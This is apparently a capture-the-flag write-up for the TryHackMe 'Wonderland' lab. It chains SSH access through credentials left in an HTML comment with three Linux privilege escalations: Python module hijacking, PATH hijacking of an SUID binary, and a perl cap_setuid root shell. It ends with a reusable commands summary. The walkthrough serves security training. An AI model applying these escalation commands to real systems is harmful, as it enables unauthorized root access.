# Wonderland - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Multi-Tier Web Directory Enumeration (`/r/a/b/b/i/t`) -> Cleartext Credential Extraction from HTML Source -> SSH Access as `alice` -> Privilege Escalation 1: Sudo Python Script Execution via Library Hijacking (`random.py`) -> Shell as `rabbit` -> Privilege Escalation 2: SUID Binary Execution via PATH Hijacking (`teaParty` invoking `date`) -> Shell as `hatter` -> Privilege Escalation 3: Linux Capabilities Abuse (`/usr/bin/perl = cap_setuid+ep`) -> Direct Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Wonderland |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 18.04) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Web Directory Enumeration, HTML Source Analysis, Python Library Hijacking, SUID PATH Manipulation, Linux Capabilities (`cap_setuid`) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.150.95 10.10.150.95
```

**Open Ports:**
- **Port 22:** OpenSSH 7.6p1 (Ubuntu Linux)
- **Port 80:** HTTP (Golang net/http server)

### 1.2 Web Directory Enumeration

Fuzzing endpoints with Gobuster revealed a top-level directory `/r/`.

Following the thematic clue of Alice in Wonderland (going down the rabbit hole), recursive directory discovery exposed individual letter directories:

```text
/r/ -> /r/a/ -> /r/a/b/ -> /r/a/b/b/ -> /r/a/b/b/i/ -> /r/a/b/b/i/t/
```

Navigating to `http://10.10.150.95/r/a/b/b/i/t/` and inspecting the page HTML source code (`Ctrl+U`):

```html
<!DOCTYPE html>
<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <!-- alice:HowDothTheLittleCrocodileImproveHisShiningTail -->
</body>
```

Discovered credentials:
- **Username:** `alice`
- **Password:** `HowDothTheLittleCrocodileImproveHisShiningTail`

---

## 2. Initial Access

Authenticate to the host via SSH using the discovered credentials:

```bash
ssh alice@10.10.150.95
```

```bash
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

In `alice`'s home directory, `root.txt` is present instead of `user.txt`, but read permissions are restricted. Checking `/root/` reveals `user.txt` (the flags are swapped):

```bash
cat /root/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

Wonderland features a multi-tiered privilege escalation chain chaining three distinct Linux privilege elevation concepts.

### 3.1 Escalation 1: Python Library Hijacking (`alice` to `rabbit`)

Checking sudo permissions for `alice`:

```bash
sudo -l
```

```text
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Inspecting `/home/alice/walrus_and_the_carpenter.py`:

```python
import random
# ... iterates and prints random lines from poem ...
```

> [!NOTE] Concept: Python Module Hijacking via Current Working Directory
> When Python processes an `import` statement, it searches the directory containing the input script (and the current working directory) before inspecting standard system library paths. Because `alice` owns `/home/alice`, creating a malicious file named `random.py` in the directory overrides the system's `random` module.

Create a malicious `random.py` module in `/home/alice`:

```bash
cat << 'EOF' > /home/alice/random.py
import os
os.system('/bin/bash')
EOF
```

Execute the script via sudo as user `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script imports the local `random.py` and spawns an interactive shell:

```bash
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

### 3.2 Escalation 2: SUID Relative Path Hijacking (`rabbit` to `hatter`)

Enumerating files in `/home/rabbit`:

```bash
ls -la /home/rabbit
```

```text
-rwsr-sr-x 1 root root 16816 May  3  2020 teaParty
```

The compiled binary `teaParty` has the SUID bit set.

Running the binary:

```bash
/home/rabbit/teaParty
```

```text
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 03 May 2020 14:15:30 +0000
Ask nicely, and he might have some tea for you.
```

Analyzing strings inside the binary:

```bash
strings /home/rabbit/teaParty | grep -E "echo|date|cat"
```

```text
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

The binary calls `echo` with an absolute path (`/bin/echo`), but invokes `date` using an **unqualified relative name**.

#### Exploitation via PATH Hijacking
Create a malicious `date` script inside `/tmp`:

```bash
cat << 'EOF' > /tmp/date
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/date
```

Prepend `/tmp` to the `$PATH` environment variable:

```bash
export PATH=/tmp:$PATH
```

Execute `teaParty`:

```bash
/home/rabbit/teaParty
```

The binary invokes `/tmp/date` and spawns a shell as `hatter`:

```bash
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

Inspecting `/home/hatter/`:

```bash
cat /home/hatter/password.txt
```

```text
WhyIsARavenLikeAWritingDesk?
```

This recovers user `hatter`'s system password, allowing direct SSH authentication.

### 3.3 Escalation 3: Linux Capabilities (`hatter` to `root`)

Audit system binaries for Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

> [!NOTE] Concept: Linux Capabilities (`cap_setuid`)
> Linux capabilities divide traditional root privileges into distinct units. The `cap_setuid` capability grants a binary permission to manipulate process UIDs. An attacker can invoke Perl with `POSIX::setuid(0)` to elevate the process directly to UID 0 without needing standard SUID permissions.

Execute a root shell using Perl's `setuid` POSIX module:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Verify root authority:

```bash
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Retrieve the root flag:

```bash
cat /home/alice/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Python Library Hijacking
echo -e "import os\nos.system('/bin/bash')" > <MODULE_NAME>.py

# Linux SUID Binary Search
find / -perm -u=s -type f 2>/dev/null

# PATH Variable Hijacking
echo '#!/bin/bash' > /tmp/<COMMAND> && echo '/bin/bash -p' >> /tmp/<COMMAND>
chmod +x /tmp/<COMMAND> && export PATH=/tmp:$PATH

# Enumerate Linux Capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid via Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

---

## 5. Key Takeaways and Lessons Learned

1. **Python Module Search Order:** Python prioritizes the script directory when resolving imported modules. If an unprivileged user has write access to the script folder, standard libraries (`random`, `sys`, `os`) can be hijacked.
2. **Relative Command Calls in SUID Binaries:** Developers often mix absolute paths (`/bin/echo`) and relative paths (`date`) in the same compiled program. Reverse-engineering strings in custom binaries quickly exposes relative execution flaws.
3. **Capabilities vs. SUID Permissions:** Privileged execution is not solely granted by the SUID bit. Linux capabilities (`getcap -r /`) assign specific root powers (such as `cap_setuid`) to standard binaries like Perl or Python, offering direct elevation paths.

---

#tryhackme #linux #medium #source-code #ssh #python-library-hijacking #sudo #suid #path-manipulation #capabilities #perl #privesc